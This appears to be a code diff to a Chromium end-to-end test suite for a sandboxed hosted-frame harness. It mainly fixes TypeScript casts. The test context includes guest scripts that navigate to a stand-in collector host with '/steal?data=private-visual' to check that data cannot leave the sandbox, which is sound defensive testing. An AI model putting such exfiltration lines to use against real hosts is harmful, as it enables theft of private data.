@@ -5,6 +5,7 @@ import { buildWorkspaceHistoryBrowser } from '@/dev/testkit/render/buildWorkspac
 import { createWorkspaceBrowserServer } from '@/dev/testkit/render/workspaceBrowserServer';
 import { appendBrowserDiagnostics, collectBrowserDiagnostics } from '../../../../../../../packages/tests/src/testkit/uiE2e/browserDiagnostics';
 
+// Chromium's injected harness is outside the test process's ambient Window declarations.
 type HarnessWindow = Window & { hostedFrameHarness: {
     mount: (body: string, network: 'none' | 'open', networkOrigins?: string[], generatedSdk?: boolean) => void;
     events: string[];
@@ -38,14 +39,14 @@ describe('caller-authored hosted frame requests in Chromium', () => {
             const page = await browser.newPage();
             await page.goto(origin);
             await page.addScriptTag({ url: `${origin}/bundle.js` });
-            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.mount('<p>SDK guest</p>', 'none', undefined, true));
+            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.mount('<p>SDK guest</p>', 'none', undefined, true));
             await page.waitForFunction(() => {
-                const harness = (window as HarnessWindow).hostedFrameHarness;
+                const harness = (window as unknown as HarnessWindow).hostedFrameHarness;
                 return harness.events.includes('ready') || harness.rejections.length > 0;
             });
             expect(await page.evaluate(() => ({
-                ready: (window as HarnessWindow).hostedFrameHarness.events.includes('ready'),
-                rejections: (window as HarnessWindow).hostedFrameHarness.rejections,
+                ready: (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('ready'),
+                rejections: (window as unknown as HarnessWindow).hostedFrameHarness.rejections,
             }))).toEqual({ ready: true, rejections: [] });
         } finally { await browser.close(); }
     });
@@ -58,7 +59,7 @@ describe('caller-authored hosted frame requests in Chromium', () => {
             page.on('pageerror', error => pageErrors.push(error.message));
             await page.goto(origin);
             await page.addScriptTag({ url: `${origin}/bundle.js` });
-            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.mount(`<script>
+            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.mount(`<script>
                 const channel = new MessageChannel();
                 const envelope = {version:1,identity:{instanceId:'browser-visual',mountNonce:'browser-nonce'},sequence:0,kind:'ready',payload:null};
                 channel.port1.onmessage = event => {
@@ -75,12 +76,12 @@ describe('caller-authored hosted frame requests in Chromium', () => {
                 channel.port1.postMessage({...envelope, payload:{port:unsupportedChannel.port1}}, [unsupportedChannel.port1]);
                 channel.port1.postMessage({...envelope, sequence:99, payload:{nested:[{ready:true}]}});
             </script>`, 'none'));
-            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.events.includes('ready'));
+            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('ready'));
             const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
             await guest.waitForFunction(() => document.body.dataset.barrier === 'ack');
             expect(await page.evaluate(() => ({
-                readyCount: (window as HarnessWindow).hostedFrameHarness.events.filter(kind => kind === 'ready').length,
-                rejections: (window as HarnessWindow).hostedFrameHarness.rejections,
+                readyCount: (window as unknown as HarnessWindow).hostedFrameHarness.events.filter(kind => kind === 'ready').length,
+                rejections: (window as unknown as HarnessWindow).hostedFrameHarness.rejections,
             }))).toEqual({
                 readyCount: 2,
                 rejections: [...Array<string>(6).fill('invalid_message'), 'identity_mismatch', 'message_kind_denied'],
@@ -95,14 +96,14 @@ describe('caller-authored hosted frame requests in Chromium', () => {
             const page = await browser.newPage();
             await page.goto(origin);
             await page.addScriptTag({ url: `${origin}/bundle.js` });
-            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.mount(`<body><button>Guest</button><script>
+            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.mount(`<body><button>Guest</button><script>
                 const channel = new MessageChannel();
                 const message = {version:1,identity:{instanceId:'browser-visual',mountNonce:'browser-nonce'},sequence:0,kind:'ready',payload:null};
                 parent.postMessage(message, '*', [channel.port2]);
                 addEventListener('message', event => { if (event.data === 'activation-probe') channel.port1.postMessage({...message,sequence:1}); });
                 document.querySelector('button').onclick = () => channel.port1.postMessage({...message,sequence:2});
             </script></body>`, 'none'));
-            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.activations.length === 1);
+            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations.length === 1);
             const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
             await guest.getByRole('button').focus();
             await page.evaluate(() => {
@@ -116,11 +117,11 @@ describe('caller-authored hosted frame requests in Chromium', () => {
                 document.body.append(button);
             });
             await page.locator('#outside').click();
-            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.activations.length === 2);
-            expect(await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false]);
+            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations.length === 2);
+            expect(await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false]);
             await guest.getByRole('button').click();
-            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.activations.length === 3);
-            expect(await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false, true]);
+            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations.length === 3);
+            expect(await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false, true]);
         } finally { await browser.close(); }
     });
 
@@ -140,10 +141,10 @@ describe('caller-authored hosted frame requests in Chromium', () => {
             });
             await page.goto(origin);
             await page.addScriptTag({ url: `${origin}/bundle.js` });
-            await page.evaluate(({ network, origins }) => (window as HarnessWindow).hostedFrameHarness.mount(
+            await page.evaluate(({ network, origins }) => (window as unknown as HarnessWindow).hostedFrameHarness.mount(
                 '<script>globalThis.scriptRan=true;location.replace("https://collector.example.test/steal?data=private-visual")</script>', network, origins,
             ), { network, origins });
-            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.events.includes('load'));
+            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('load'));
             expect(outbound).toEqual([]);
             const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame());
             expect(guest).toBeDefined();
@@ -173,16 +174,16 @@ describe('caller-authored hosted frame requests in Chromium', () => {
             </script></body>`;
             const options = { body, network: policy === 'open' ? 'open' as const : 'none' as const,
                 origins: policy === 'origins' ? ['https://approved.example.test'] : undefined };
-            await page.evaluate(options => (window as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
+            await page.evaluate(options => (window as unknown as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
             phase = 'guest-ready';
-            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.events.includes('ready'));
+            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('ready'));
             const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
             phase = 'bridge-ack-and-approved-resource';
             await guest.waitForFunction(() => document.body.dataset.reply === 'ack' && document.body.dataset.asset === 'approved');
             expect(await guest.evaluate(() => {
                 try { return parent.document.cookie; } catch { return 'isolated'; }
             })).toBe('isolated');
-            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.push({ kind: 'host-push' }));
+            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.push({ kind: 'host-push' }));
             phase = 'host-push';
             await guest.waitForFunction(() => document.body.dataset.reply === 'host-push');
             const expectedOutbound = policy === 'open'
@@ -191,15 +192,15 @@ describe('caller-authored hosted frame requests in Chromium', () => {
             expect(outbound.sort()).toEqual(expectedOutbound);
 
             // An equivalent immutable graph must preserve the executable document and its port.
-            await page.evaluate(options => (window as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
-            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.push({ kind: 'retained-push' }));
+            await page.evaluate(options => (window as unknown as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
+            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.push({ kind: 'retained-push' }));
             phase = 'equivalent-document-push';
             await guest.waitForFunction(() => document.body.dataset.reply === 'retained-push');
             expect(outbound.sort()).toEqual(expectedOutbound);
 
             await guest.evaluate(() => location.replace('https://collector.example.test/delayed?data=private-visual'));
             phase = 'navigation-retirement';
-            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.events.includes('retired'));
+            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('retired'));
             expect(outbound.sort()).toEqual(expectedOutbound);
         } catch (error) {
             throw appendBrowserDiagnostics(error, `Frame browser phase: ${phase}\n${readDiagnostics()}`);
